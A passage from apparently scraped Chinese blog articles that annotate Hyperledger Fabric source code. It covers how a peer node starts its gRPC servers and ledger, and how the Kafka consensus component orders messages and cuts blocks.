初始化配置交易消息处理器字典，设置给全局变量processors字典\n\tcustomtx.Initialize(customTxProcessors)\n\tcceventmgmt.Initialize()                // 初始化链码事件管理器\n\tprovider, err := kvledger.NewProvider() // 创建本地Peer节点账本提供者\n\tif err != nil {\n\t\tpanic(fmt.Errorf(&quot;Error in instantiating ledger provider: %s&quot;, err))\n\t}\n\tprovider.Initialize(kvLedgerStateListeners) // 初始化状态监听器\n\tledgerProvider = provider                   // 设置为全局默认的Peer节点账本提供者\n\tlogger.Info(&quot;ledger mgmt initialized&quot;)\n}\n正本提供者有以下几种：\n\n\n账本ID数据库（idStore类型）：提供存储账本ID（即链ID）与创世区块键值对的LevelDB数据库；\n\n\n账本数据存储对象提供者（ledgerstorage.Provider类型）：创建账本数据存储对象，负责管理区块数据文件、隐私数据库、区块索引数据库等；\n\n\n历史数据库提供者（HistoryDBProvider类型）：创建历史数据库，存储每个状态数据的历史信息；\n\n\n状态数据库提供者（CommonStorageDBProvider类型）：创建状态数据库（LevelDB或CouchDB类型），存储世界状态（world state），包括有效交易的公有数据与隐私数据。\n\n\n④：初始化服务器参数\nif chaincodeDevMode {\n\t\t//设置链码模式\n\t\tviper.Set(&quot;chaincode.mode&quot;, chaincode.DevModeUserRunsChaincode)\n \n\t}\n\t// 读取配置并缓存Peer节点地址与端点\n\tif err := peer.CacheConfiguration(); err != nil {\n\t\treturn err\n\t}\n\t// 获取缓存的Peer端点\n\tpeerEndpoint, err := peer.GetPeerEndpoint()\n\t...\n\tvar peerHost string\n\t// 获取Peer节点IP地址，注意IP地址与端口已经被分离\n\tpeerHost, _, err = net.SplitHostPort(peerEndpoint.Address)\n创建GRPC服务器\n①：创建gRPC服务器\nserve()函数创建了至少 3 个gRPC服务器（独立端口），用于注册Peer节点功能服务器，如下所示：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号端口功能服务器说明服务接口17051DeliverEvents事件服务器处理区块请求消息Deliver()7051Admin服务器获取节点状态、维护日志等GetStatus()7051Endorser背书服务器提供背书服务ProcessProposal()7051Gossip消息服务器组织内节点分发数据与同步状态等GossipStream()27052chaincodeSupport链码支持服务器提供Peer节点链码支持服务Register()37053EventHub事件服务器提供订阅事件服务(1.3.0废弃)Chat()\nserverConfig, err := peer.GetServerConfig()\n\t...\npeerServer, err := peer.CreatePeerServer(listenAddr, serverConfig)\n②：创建EventHub事件服务器\n\tif serverConfig.SecOpts.UseTLS {\n\t\t...\n\t\tcs := comm.GetCredentialSupport() // 创建证书支持对象CredentialSupport结构对象\n\t\tcs.ServerRootCAs = serverConfig.SecOpts.ServerRootCAs\n\t\t//// 获取gRPC客户端证书用于TLS连接认证\n\t\tclientCert, err := peer.GetClientCertificate()\n\t\t// 设置客户端证书\n\t\tcomm.GetCredentialSupport().SetClientCertificate(clientCert)\n\t}\n\t//// 创建事件EventHub服务器（7053端口）\n\tehubGrpcServer, err := createEventHubServer(serverConfig)\n③：创建DeliverEvents事件服务器\nserve()函数检查如果开启了双向的TLS安全认证，则设置mutualTLS标志位为true，并定义获取资源策略检查器即policyCheckerProvider()函数。该函数将直接调用全局变量aclProvider对象的CheckACL()方法，检查签名消息在通道（channelID）上是否满足指定资源的访问控制权限策略。\n接着，serve()函数调用peer.NewDeliverEventsServer()函数，基于mutualTLS、policy-CheckerProvider等参数创建DeliverEvents事件服务器abServer，提供Deliver()与DeliverFiltered()服务接口，分别用于处理请求正常区块与过滤区块的消息。\n然后调用pb.RegisterDeliverServer()方法，将DeliverEvents事件服务器abServer注册到默认的gRPC服务器上（7051端口），以提供本地事件服务。\n//// 检查是否开启了双向的TLS安全认证\n\tmutualTLS := serverConfig.SecOpts.UseTLS &amp;&amp; serverConfig.SecOpts.RequireClientCert\n\t//// 定义资源访问权限策略检查函数\n\tpolicyCheckerProvider := func(resourceName string) deliver.PolicyChecker {\n\t\treturn func(env *cb.Envelope, channelID string) error {\n\t\t\treturn aclmgmt.GetACLProvider().CheckACL(resourceName, channelID, env)\n\t\t}\n\t}\n\t//创建DeliverEvents事件服务器，并注册到Peer节点gRPC服务器上（7051端口）\n\tabServer := peer.NewDeliverEventsServer(mutualTLS, policyCheckerProvider, &amp;peer.DeliverSupportManager{})\n\tpb.RegisterDeliverServer(peerServer.Server(), abServer)\n④：创建ChaincodeSupport链码支持服务器\n//创建链码支持服务专用gRPC服务器与链码支持服务实例ChaincodeSupport（专用端口或7052端口）\n\tccSrv, ccEndpoint, err := createChaincodeServer(ca, peerHost)\n\tif err != nil {\n\t\tlogger.Panicf(&quot;Failed to create chaincode server: %s&quot;, err)\n\t}\n\t//将链码支持服务器实例ChaincodeSupoort对象注册到Peer节点gRPC服务器上\n\t// 同时注册系统链码以支持部署调用系统链码\n\tregisterChaincodeSupport(ccSrv, ccEndpoint, ca)\n\tgo ccSrv.Start() //启动gRPC服务器提供链码支持服务\n⑤：创建Admin管理服务器与Endorser背书服务器\n\t//创建Admin管理服务器与\n\tpb.RegisterAdminServer(peerServer.Server(), core.NewAdminServer())\n\t// 定义Gossip协议分发隐私数据函数\n\tprivDataDist := func(channel string, txID string, privateData *rwset.TxPvtReadWriteSet) error {\n\t\treturn service.GetGossipService().DistributePrivateData(channel, txID, privateData)\n\t}\n\t//创建新的EndorserServer背书节点服务器\n\tserverEndorser := endorser.NewEndorserServer(privDataDist, &amp;endorser.SupportImpl{})\n\tlibConf := library.Config{}\n\tif err = viperutil.EnhancedExactUnmarshalKey(&quot;peer.handlers&quot;, &amp;libConf); err != nil {\n\t\treturn errors.WithMessage(err, &quot;could not load YAML config&quot;)\n\t}\n\t//// 创建消息过滤器列表\n\tauthFilters := library.InitRegistry(libConf).Lookup(library.Auth).([]authHandler.Filter)\n\t// 将所有消息过滤器均构造成消息过滤器链，并返回第1个过滤器（Filter类型，实现了EndorserServer // 接口）\n\tauth := authHandler.ChainFilters(serverEndorser, authFilters...)\n\t// Register the Endorser server\n\t//// 注册EndorserServer背书服务器到gRPC服务器\n\tpb.RegisterEndorserServer(peerServer.Server(), auth)\n⑥：创建Gossip消息服务器\n\t//获取Bootstrap连接的初始节点地址列表，默认为127.0.0.1:7051\n\tbootstrap := viper.GetStringSlice(&quot;peer.gossip.bootstrap&quot;)\n \n\t////获取本地MSP签名者身份实体 并序列化\n\tserializedIdentity, err := mgmt.GetLocalSigningIdentityOrPanic().Serialize()\n\t...\n\tmessageCryptoService := peergossip.NewMCS( // 构造Gossip消息加密服务组件\n\t\tpeer.NewChannelPolicyManagerGetter(), // 通道策略管理器获取组件\n\t\tlocalmsp.NewSigner(),                 // 本地签名者\n\t\tmgmt.NewDeserializersManager())       // 身份反序列化组件管理器\n\tsecAdv := peergossip.NewSecurityAdvisor(mgmt.NewDeserializersManager())\n \n\t// callback function for secure dial options for gossip service\n\t//定义Gossip服务器回调函数，用于创建Gossip服务器安全配置的gRPC拨号连接选项\n\tsecureDialOpts := func() []grpc.DialOption {\n\t\tvar dialOpts []grpc.DialOption\n\t\t// set max send/recv msg sizes\n\t\tdialOpts = append(dialOpts, grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(comm.MaxRecvMsgSize()),\n\t\t\tgrpc.MaxCallSendMsgSize(comm.MaxSendMsgSize()))) // 设置最大发送和接收消息字节数\n\t\t// set the keepalive options\n\t\tkaOpts := comm.DefaultKeepaliveOptions() // 获取默认的心跳消息keepalive选项\n\t\t...\n\t\t//在gRPC通信拨号连接选项中设置心跳通信keepalive选项\n\t\tdialOpts = append(dialOpts, comm.ClientKeepaliveOptions(kaOpts)...)\n \n\t\tif comm.TLSEnabled() { // 启用TLS安全认证，设置客户端TLS通信证书\n\t\t\tdialOpts = append(dialOpts, grpc.WithTransportCredentials(comm.GetCredentialSupport().GetPeerCredentials()))\n\t\t} else {\n\t\t\tdialOpts = append(dialOpts, grpc.WithInsecure()) // 否则，关闭TLS安全认证\n\t\t}\n\t\treturn dialOpts\n\t}\n \n\t// 检查gRPC服务器端是否启用TLS安全认证，获取并设置服务器端与客户端身份证书\n\tvar certs *common2.TLSCertificates\n\tif peerServer.TLSEnabled() {\n\t\tserverCert := peerServer.ServerCertificate()\n\t\tclientCert, err := peer.GetClientCertificate()\n\t\tif err != nil {\n\t\t\treturn errors.Wrap(err, &quot;failed obtaining client certificates&quot;)\n\t\t}\n\t\tcerts = &amp;common2.TLSCertificates{}\n\t\tcerts.TLSServerCert.Store(&amp;serverCert)\n\t\tcerts.TLSClientCert.Store(&amp;clientCert)\n\t}\n \n\t// 创建Gossip消息服务器实例gossipServiceInstance\n\terr = service.InitGossipService(serializedIdentity, peerEndpoint.Address, peerServer.Server(), certs,\n\t\tmessageCryptoService, secAdv, secureDialOpts, bootstrap...)\n部署系统链码与初始化现存通道的链结构\n①：部署系统链码\n\t//部署系统链码\n\tinitSysCCs()\n②：初始化现存通道上的链结构\n//初始化现存通道上的链结构\n\tpeer.Initialize(func(cid string) {\n\t})\n\ncore/peer/peer.go/Initialize\n\nfunc Initialize(init func(string)) {\n\tnWorkers := viper.GetInt(&quot;peer.validatorPoolSize&quot;) // 获取交易验证线程数量\n\tif nWorkers &lt;= 0 {\n\t\tnWorkers = runtime.NumCPU()\n\t}\n\t//// 设置信号量并发访问数量\n\tvalidationWorkersSemaphore = semaphore.NewWeighted(int64(nWorkers))\n \n\tchainInitializer = init // 设置初始化函数\n \n\tvar cb *common.Block\n\tvar ledger ledger.PeerLedger\n\t//// 初始化账本管理器\n\tledgermgmt.Initialize(ConfigTxProcessors)\n\t//// 获取当前账本管理器下的账本ID列表\n\tledgerIds, err := ledgermgmt.GetLedgerIDs()\n\tif err != nil {\n\t\tpanic(fmt.Errorf(&quot;Error in initializing ledgermgmt: %s&quot;, err))\n\t}\n\tfor _, cid := range ledgerIds {\n\t\tpeerLogger.Infof(&quot;Loading chain %s&quot;, cid)\n\t\t//创建本地Peer节点账本\n\t\tif ledger, err = ledgermgmt.OpenLedger(cid); err != nil {\n\t\t\tpeerLogger.Warningf(&quot;Failed to load ledger %s(%s)&quot;, cid, err)\n\t\t\tpeerLogger.Debugf(&quot;Error while loading ledger %s with message %s. We continue to the next ledger rather than abort.&quot;, cid, err)\n\t\t\tcontinue\n\t\t}\n\t\t//// 从指定通道账本中获取最新配置区块\n\t\tif cb, err = getCurrConfigBlockFromLedger(ledger); err != nil {\n\t\t\tpeerLogger.Warningf(&quot;Failed to find config block on ledger %s(%s)&quot;, cid, err)\n\t\t\tpeerLogger.Debugf(&quot;Error while looking for config block on ledger %s with message %s. We continue to the next ledger rather than abort.&quot;, cid, err)\n\t\t\tcontinue\n\t\t}\n\t\t// Create a chain if we get a valid ledger with config block\n\t\t//// 在Peer节点上创建指定通道的链结构\n\t\tif err = createChain(cid, ledger, cb); err != nil {\n\t\t\tpeerLogger.Warningf(&quot;Failed to load chain %s(%s)&quot;, cid, err)\n\t\t\tpeerLogger.Debugf(&quot;Error reloading chain %s with message %s. We continue to the next chain rather than abort.&quot;, cid, err)\n\t\t\tcontinue\n\t\t}\n\t\t// 用自定义函数初始化通道链结构，如部署系统链码\n\t\tInitChain(cid)\n\t}\n}\n启动gRPC服务器与profile服务器\n// 建立传递错误消息的通道\n\tserve := make(chan error)\n\t// 传递信号的通道\n\tsigs := make(chan os.Signal, 1)\n\t// 设置本进程信号通道的通知信号，包括中断/终止信号\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {// 设置本进程阻塞等待的特定通知信号\n\t\tsig := &lt;-sigs // 从sigs通道读取信号值，阻塞等待方式\n\t\tlogger.Debugf(&quot;sig: %s&quot;, sig)\n\t\tserve &lt;- nil\n\t}()\n\t\t// 利用goroutine 启动gRPC服务器（7051端口，注册了Admin管理服务器、Endorser背书服务器等）\n\tgo func() {\n\t\tvar grpcErr error\n\t\tif grpcErr = peerServer.Start(); grpcErr != nil { // 监听端口（7051）提供服务\n\t\t\tgrpcErr = fmt.Errorf(&quot;grpc server exited with error: %s&quot;, grpcErr)\n\t\t} else {\n\t\t\tlogger.Info(&quot;peer server exited&quot;)\n\t\t}\n\t\tserve &lt;- grpcErr // 若因发生错误而退出，则发送错误到serve通道\n\t}()\n\t\t// 向进程文件中写入运行进程ID\n\tif err := writePid(config.GetPath(&quot;peer.fileSystemPath&quot;)+&quot;/peer.pid&quot;, os.Getpid()); err != nil {\n\t\treturn err\n\t}\n \n\t// Start the event hub server\n\t// 启动基于专用事件监听端口的gRPC服务器（7053端口，已注册EventHub事件服务器）\n\tif ehubGrpcServer != nil {\n\t\tgo ehubGrpcServer.Start()\n\t}\n \n\t// Start profiling http endpoint if enabled\n\t// 如果打开profile使能标志位，则启动提供服务\n\tif viper.GetBool(&quot;peer.profile.enabled&quot;) {\n\t\tgo func() { // 启动go profile服务器，如果出错，则不会发送错误信息，只是记录到日志里\n\t\t\t// 获取profile监听地址\n\t\t\tprofileListenAddress := viper.GetString(&quot;peer.profile.listenAddress&quot;)\n\t\t\tlogger.Infof(&quot;Starting profiling server with listenAddress = %s&quot;, profileListenAddress)\n\t\t\tif profileErr := http.ListenAndServe(profileListenAddress, nil); profileErr != nil {\n\t\t\t\tlogger.Errorf(&quot;Error starting profiler: %s&quot;, profileErr)\n\t\t\t}\n\t\t}()\n\t}\n \n至此，Peer节点及其功能服务器启动完毕.\n\n参考\n\ngithub.com/blockchainGuide/\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_kafka共识排序-4":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger-fabric源码_kafka共识排序-4","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/死磕hyperledger fabric源码_kafka共识排序-4.md","title":"死磕hyperledger fabric源码_kafka共识排序-4","links":[],"tags":[],"content":"\n死磕hyperledger fabric源码|kafka共识排序\n文章及代码：github.com/blockchainGuide/\n分支：v1.1.0\n\n\n概述\nOrderer共识组件提供HandleChain()方法创建通道绑定的共识组件链对象（consensus.Chain接口），包括Solo（solo.chain类型）、Kafka（kafka.chainImpl类型）等类型，属于通道共识组件的重要实现模块，并设置到链支持对象的cs.Chain字段。共识组件链对象提供Orderer共识排序服务，负责关联通道上交易排序、打包出块、提交账本、通道管理等工作，目前采用Golang通道或Kafka集群作为共识排序后端，接收来自Broadcast服务过滤转发的交易消息并进行排序。\nkafka共识排序服务\norderer服务集群\nOrderer节点采用Sarama开源的Kafka第三方库构建Kafka共识组件，可以同时接受处理多个客户端发送的交易消息请求，能够有效提高Orderer节点处理交易消息的并发能力。同时，可利用Kafka集群在单一分区内按序收集相同主题消息（消息序号唯一）的功能，来保证交易消息具有确定性的顺序（以消息序号排序），从而实现对交易排序达成全局共识的目的。\nKafka生产者按照主题（Topic）生产消息并进行发布，Kafka服务器集群自动对消息主题进行分类。同一个主题的消息都会被收集到一个或多个分区文件中，按照FIFO的顺序追加到文件尾部，并且每个消息在分区中都会有一个OFFSET位置偏移量作为该消息的唯一标识ID。目前，Hyperledger Fabric基于Kafka集群为每个通道创建绑定了一个主题（即链ID，chainID），并且只设置一个分区（分区号为0）。Kafka消费者管理多个分区消费者并订阅指定分区的主题消息，包括主题（即chainID）、分区号（目前只有1个分区号为0的分区）、起始偏移量（开始订阅的消息位置offset）等。\nHyperledger Fabric采用Kafka集群对单个或多个Orderer排序节点提交的交易消息进行排序。此时，Orderer排序节点同时充当Kafka集群的消息生产者（分区）和消费者，发布消息与订阅消息到Kafka集群上的同一个主题分区，即先将Peer节点提交的交易消息转发给Kafka服务端，同时，从指定主题的Kafka分区上按顺序获取排序后的交易消息并自动过滤重启的交易消息。这期间可能会存在网络时延造成获取消息时间的差异。如果不考虑丢包造成消息丢失的情况，则所有Orderer节点获取消息的顺序与数量应该是确定的和一致的。同时，采用相同的Kafka共识组件链对象与出块规则等，以保证所有Orderer节点都可以创建与更新相同配置的通道，并切割生成相同的批量交易集合出块，再“同步”构造出相同的区块数据，从而基于Kafka集群达成全局共识，以保证区块数据的全局一致性。\n启动共识组件链对象\n启动入口：\n\norderer/consensus/kafka/chain.go/Start()\n\nfunc (chain *chainImpl) Start() {\n\tgo startThread(chain)\n}\nfunc startThread(chain *chainImpl) {\n\t...\n\t//创建kafka生产者\n\tchain.producer, err = setupProducerForChannel(chain.consenter.retryOptions(), chain.haltChan, chain.SharedConfig().KafkaBrokers(), chain.consenter.brokerConfig(), chain.channel)\n\t...\n\t// Kafka生产者发送CONNECT消息建立连接\n\tif err = sendConnectMessage(chain.consenter.retryOptions(), chain.haltChan, chain.producer, chain.channel); err != nil {\n\t\tlogger.Panicf(&quot;[channel: %s] Cannot post CONNECT message = %s&quot;, chain.channel.topic(), err)\n\t}\n\t...\n\t//创建Kafka消费者\n\tchain.parentConsumer, err = setupParentConsumerForChannel(chain.consenter.retryOptions(), chain.haltChan, chain.SharedConfig().KafkaBrokers(), chain.consenter.brokerConfig(), chain.channel)\n\t...\n\t//创建Kafka分区消费者\n\tchain.channelConsumer, err = setupChannelConsumerForChannel(chain.consenter.retryOptions(), chain.haltChan, chain.parentConsumer, chain.channel, chain.lastOffsetPersisted+1)\n\t...\n\tclose(chain.startChan) // 已经启动共识组件链对象，不阻塞Broadcast\n\tchain.errorChan = make(chan struct{}) // 创建errorChan通道，不阻塞Deliver服务处理句柄\n\t...\n\tchain.processMessagesToBlocks() //创建消息处理循环，循环处理订阅分区上接收到的消息\n}\nstartThread函数首先创建kafka生产者，发布消息到指定主题（即通道ID）和分区号的通道分区（chain.channel）上。\n然后发送CONNECT消息建立连接，该消息指定了主题Topic字段为链ID、Key字段为分区号0、Value字段为CONNECT类型消息负载等。订阅该主题的Kafka（分区）消费者会接收到该消息。\n接着创建指定Kafka分区和Broker服务器配置的Kafka消费者对象，并设置从指定主题（链ID）和分区号（0）的Kafka分区上获取消息。\n最后，调用processMessagesToBlocks()方法创建消息处理循环，负责处理从Kafka集群中接收到的订阅消息。\n处理消息\nprocessMessagesToBlocks接收到正常的Kafka分区消费者消息会根据kafka的消息类型进行处理，包括以下几种类型：\n\nKafka- Message_Regular\nKafkaMessage_TimeToCut\nKafkaMessage_Connect\n\nfunc (chain *chainImpl) processMessagesToBlocks() ([]uint64, error) {\n\t...\n\tfor { // 消息处理循环\n\t\tselect {\n\t\t...\n\t\tcase in, ok := &lt;-chain.channelConsumer.Messages(): //接收到正常的Kafka分区消费者消息\n\t\t\t...\n\t\t\tselect {\n\t\t\tcase &lt;-chain.errorChan: // If this channel was closed...  // 如果该通道已经关闭，则重新创建该通道\n\t\t\t\t...\n\t\t\tswitch msg.Type.(type) { //分析Kafka消息类型\n\t\t\tcase *ab.KafkaMessage_Connect: //Kafka连接消息  由于错误而重新恢复Kafka消费者分区订阅流程\n\t\t\t\t_ = chain.processConnect(chain.ChainID()) //处理CONNECT连接消息， 不做任何事情\n\t\t\t\tcounts[indexProcessConnectPass]++         // 成功处理消息计数增1\n\t\t\tcase *ab.KafkaMessage_TimeToCut: // Kafka定时切割生成区块消息\n\t\t\t\tif err := chain.processTimeToCut(msg.GetTimeToCut(), in.Offset); err != nil {\n\t\t\t\t\tlogger.Warningf(&quot;[channel: %s] %s&quot;, chain.ChainID(), err)\n\t\t\t\t\tlogger.Criticalf(&quot;[channel: %s] Consenter for channel exiting&quot;, chain.ChainID())\n\t\t\t\t\tcounts[indexProcessTimeToCutError]++\n\t\t\t\t\treturn counts, err // TODO Revisit whether we should indeed stop processing the chain at this point\n\t\t\t\t}\n\t\t\t\tcounts[indexProcessTimeToCutPass]++ // 成功处理消息计数增1\n\t\t\tcase *ab.KafkaMessage_Regular: // Kafka常规消息\n\t\t\t\tif err := chain.processRegular(msg.GetRegular(), in.Offset); err != nil { // 处理Kafka常 规消息\n\t\t\t\t\t...\n\t\t\t\t\tcounts[indexProcessRegularError]++\n        }...\n      }\n\t\tcase &lt;-chain.timer: // 超时定时器\n\t\t\tif err := sendTimeToCut(chain.producer, chain.channel, chain.lastCutBlockNumber+1, &amp;chain.timer); err != nil { //发送TimeToCut类型消息，请求打包出块\n\t\t\t...\n\t\t\t\tcounts[indexSendTimeToCutError]++\n\t\t\t} ...\n\t\t}\n\t}\n}\n①：KafkaMessage_Connect类型消息\nKafka连接消息用于测试连通Kafka分区消费者的工作状态，用于验证Kafka共识组件的正常工作状态与排除故障，并调用chain.processConnect(chain.ChainID())方法处理该消息。\n②：KafkaMessage_TimeToCut类型消息\nprocessMessagesToBlocks()方法可调用chain.processTimeToCut()方法处理TIMETOCUT类型消息。如果消息中的区块号ttcNumber不是当前Orderer节点当前通道账本中下一个打包出块的区块号（最新区块号lastCutBlockNumber+1），则直接丢弃不处理。否则，调用BlockCutter().Cut()方法，切割当前该通道上待处理的缓存交易消息列表为批量交易集合batch（[]*cb.Envelope），再调用CreateNextBlock(batch)方法构造新区块并提交账本。最后，调用WriteBlock(block，metadata)方法，更新区块元数据并提交账本，同时更新Kafka共识组件链对象的最新区块号lastCutBlockNumber增1。\n事实上，Orderer服务集群节点独立打包出块的时间点通常不是完全同步的，同时还可能会重复接收其他Orderer节点提交的TIMETOCUT类型消息（重复区块号）。此时，Orderer节点以接收到的第一个TIMETOCUT类型消息为准，打包出块并提交到账本，再更新当前通道的最新区块号lastCutBlockNumber。这样，processTimeToCut()方法就能利用最新的lastCutBlockNumber过滤掉其他重复的TIMETOCUT类型消息，以保证所有Orderer节点上账本区块文件的数据同步，实际上是将原先的时间同步机制转换为消息同步机制。\n③：KafkaMessage_Regular类型消息\n包括通道配置交易消息（KafkaMessageRegular_CONFIG类型）和普通交易消息（KafkaMessageRegular_NORMAL类型）。 详细的分析将会在processRegular方法中体现。\n处理配置交易消息\n我们先大概的看一下ProcessRegular中关于处理配置交易消息的代码部分,因为这部分相当的长，必须先看个概览：\nfunc (chain *chainImpl) processRegular(regularMessage *ab.KafkaMessageRegular, receivedOffset int64) error {\n  ...\n  commitConfigMsg := func(message *cb.Envelope, newOffset int64){...}\n  seq := chain.Sequence() // 获取当前通道的最新配置序号\n  ...\n  switch regularMessage.Class {\n\tcase ab.KafkaMessageRegular_UNKNOWN: // 未知消息类型\n\t...\n\tcase ab.KafkaMessageRegular_NORMAL: // 普通交易消息类型\n\t\t...\n\tcase ab.KafkaMessageRegular_CONFIG: // 通道配置交易消息\n\t...\n\t\t}\n\t...\n}\n我们直接跳转到case ab.KafkaMessageRegular_CONFIG进行分析：\n①：如果regularMessage.OriginalOffset 不为 0\n说明这是重新过滤验证和排序的通道配置交易消息。\n1.1 过滤重复提交的消息\nif regularMessage.OriginalOffset &lt;= chain.lastOriginalOffsetProcessed {}\n1.2 确认是否是最近重新验证且重新排序的配置交易消息，并且通道配置序号是最新的\nif regularMessage.OriginalOffset == chain.lastResubmittedConfigOffset &amp;&amp;regularMessage.ConfigSeq == seq {\n  // 因此，关闭通道并解除Broadcast服务处理句柄阻塞等待，通知重新接收消息进行处理\n  close(chain.doneReprocessingMsgInFlight) \n}\n1.3 主动更新本通道的最近重新提交排序的配置交易消息初始偏移量lastResubmitted\n存在其他Orderer节点重新提交了配置消息，但是本地Orderer节点没有重新提交该消息。因此这里需要更新本通道的最近重新提交排序的配置交易消息初始偏移量lastResubmitted。\nif chain.lastResubmittedConfigOffset &lt; regularMessage.OriginalOffset {\n\t\t\t\tchain.lastResubmittedConfigOffset = regularMessage.OriginalOffset\n\t\t\t}\n②：regularMessage.OriginalOffset为 0\n说明是第一次提交通道配置交易消息，而不是重新验证和重新排序的。\n2.1 如果消息中的配置序号regularMessage.ConfigSeq小于当前通道的最新配置序号seq\n则说明已经更新了通道配置（配置序号较高），然后再处理当前配置交易消息（配置序号较低）。将会调用ProcessConfigMsg重新过滤和处理该消息。\n接着通过configure重新提交该配置消息进行排序，重置消息初始偏移量。然后再更新最近重新提交消息的偏移量。\nif regularMessage.ConfigSeq &lt; seq {\n  ...\n\tconfigEnv, configSeq, err := chain.ProcessConfigMsg(env)\n  if err := chain.configure(configEnv, configSeq, receivedOffset); err != nil {...}\n  \n  // 阻塞接收消息处理，更新最近重新提交消息的偏移量\n  chain.lastResubmittedConfigOffset = receivedOffset \n  //创建通道阻塞Broadcast服务接收处理消息\n  chain.doneReprocessingMsgInFlight = make(chan struct{})\n}\n③：提交配置交易消息执行通道管理操作\n经过上面的①和②过滤掉不符合条件的情况，接下来就提交配置交易消息执行通道管理操作，核心函数：commitConfigMsg(env, offset)\n3.1 将当前缓存交易消息切割成批量交易集合\nbatch := chain.BlockCutter().Cut()\n3.2 创建新区块block\nblock := chain.CreateNextBlock(batch)\n3.3 构造Kafka元数据\nmetadata := utils.MarshalOrPanic(&amp;ab.KafkaMetadata{ //构造Kafka元数据\n\t\t\t\tLastOffsetPersisted:         receivedOffset - 1, // 偏移量减1\n\t\t\t\tLastOriginalOffsetProcessed: chain.lastOriginalOffsetProcessed,\n\t\t\t\tLastResubmittedConfigOffset: chain.lastResubmittedConfigOffset,\n\t\t\t})\n3.4 写入区块\n通过区块写组件提交新区块到账本，更新当前通道的最新区块号chain.lastCutBlockNumber增1\nchain.WriteBlock(block, metadata)\nchain.lastCutBlockNumber++  \n接着更新本链的lastOriginal- OffsetProcessed为newOffset参数，然后做和上面差不多的事情：\nchain.lastOriginalOffsetProcessed = newOffset\n\t\tblock := chain.CreateNextBlock([]*cb.Envelope{message}) // 构造新区块\n\t\tmetadata := utils.MarshalOrPanic(&amp;ab.KafkaMetadata{     // 构造Kafka元数据\n\t\t\tLastOffsetPersisted:         receivedOffset,\n\t\t\tLastOriginalOffsetProcessed: chain.lastOriginalOffsetProcessed,\n\t\t\tLastResubmittedConfigOffset: chain.lastResubmittedConfigOffset,\n\t\t})\n\t\tchain.WriteConfigBlock(block, metadata) // 写入配置区块\n\t\tchain.lastCutBlockNumber++              // 最新区块号增1\n不管是上面的WriteBlock还是WriteConfigBlock底层都是调用的commitBlock，如下：\nfunc (bw *BlockWriter) commitBlock(encodedMetadataValue []byte) {\n\t... // 添加块签名\n\tbw.addBlockSignature(bw.lastBlock)\n  // 添加最新的配置签名\n\tbw.addLastConfigSignature(bw.lastBlock)\n\t// 写入新块\n\terr := bw.support.Append(bw.lastBlock)\n\t...\n}\n接下来再讨论kafka共识组件如何处理普通交易消息的。\n处理普通交易消息\n还是先回到 processRegular方法，关于处理普通消息的方法大概如下：\nfunc (chain *chainImpl) processRegular(regularMessage *ab.KafkaMessageRegular, receivedOffset int64) error {\n  ...\n  case ab.KafkaMessageRegular_NORMAL: // 普通交易消息类型\n\t\t// 如果OriginalOffset不是0，则说明该消息是重新验证且重新提交排序的\n\t\tif regularMessage.OriginalOffset != 0 {\n\t\t\t...\n\t\t\t// 如果消息偏移量不大于lastOriginalOffsetProcessed最近已处理消息的偏移量，\n\t\t\t// 则说明已经处理过该消息，此时应丢弃返回，防止重复处理其他Orderer提交的相同偏移 量的普通交易消息\n\t\t\tif regularMessage.OriginalOffset &lt;= chain.lastOriginalOffsetProcessed {\n\t\t\t\t...\n\t\t}\n \n\t\t// // 检查通道的配置序号是否更新\n\t\tif regularMessage.ConfigSeq &lt; seq {\n\t\t\t...\n\t\t\t//// 消息的配置序号低，需要重新验证过滤消息\n\t\t\tconfigSeq, err := chain.ProcessNormalMsg(env)\n\t\t\t...\n\t\t\t//重新提交普通交易消息\n      if err := chain.order(env, configSeq, receivedOffset); err != nil {}\n\t\t\t\t...\n\t\t}\n\t\t// advance lastOriginalOffsetProcessed iff message is re-validated and re-ordered\n\t\t//当且仅当消息重新验证和重新排序时，才需要修正lastOriginalOffsetProcessed偏移量\n\t\toffset := regularMessage.OriginalOffset\n\t\tif offset == 0 {\n\t\t\toffset = chain.lastOriginalOffsetProcessed\n\t\t}\n\t\t// 提交处理普通交易消息，offset为最近处理的普通交易消息偏移量\n\t\tcommitNormalMsg(env, offset)\n}\n处理普通交易消息的流程与处理配置交易消息的流程基本类似，主要看最后的commitNormalMsg(env, offset)，我们来继续分析：\ncommitNormalMsg := func(message *cb.Envelope, newOffset int64) {\n\t\t//// 添加所接收的消息到缓存交易消息列表，并切割成批量交易集合列表batches\n\t\tbatches, pending := chain.BlockCutter().Ordered(message)\n\t\t...\n\t\tif len(batches) == 0 {\n\t\t\t// 如果不存在批量交易集合，则启动定时器周期性地发送切割出块消息n\n\t\t\tchain.lastOriginalOffsetProcessed = newOffset\n\t\t\tif chain.timer == nil {\n\t\t\t\tchain.timer = time.After(chain.SharedConfig().BatchTimeout())\n\t\t\t...\n\t\t\treturn\n\t\t}\n\t\tchain.timer = nil\n\t\toffset := receivedOffset // 设置当前消息偏移量\n\t\tif pending || len(batches) == 2 {\n\t\t\toffset-- // 计算第1个批量交易消息的偏移量是offset减1\n\t\t} else {  // 只有1个批量交易集合构成1个区块\n\t\t\t//// 设置第1个批量交易集合的消息偏移量为newOffset\n\t\t\tchain.lastOriginalOffsetProcessed = newOffset\n\t\t}\n\t\t//// 构造并提交第1个区块\n\t\tblock := chain.CreateNextBlock(batches[0])\n\t\tmetadata := utils.MarshalOrPanic(&amp;ab.KafkaMetadata{\n\t\t\tLastOffsetPersisted:         offset,\n\t\t\tLastOriginalOffsetProcessed: chain.lastOriginalOffsetProcessed,\n\t\t\tLastResubmittedConfigOffset: chain.lastResubmittedConfigOffset,\n\t\t})\n\t\tchain.WriteBlock(block, metadata) // 更新区块元数据，并提交区块到账本\n\t\tchain.lastCutBlockNumber++ // 更新当前通道上最近出块的区块号增1\n\t...\n\t\t// Commit the second block if exists\n\t\t//// 检查第2个批量交易集合，构造并提交第2个区块\n\t\tif len(batches) == 2 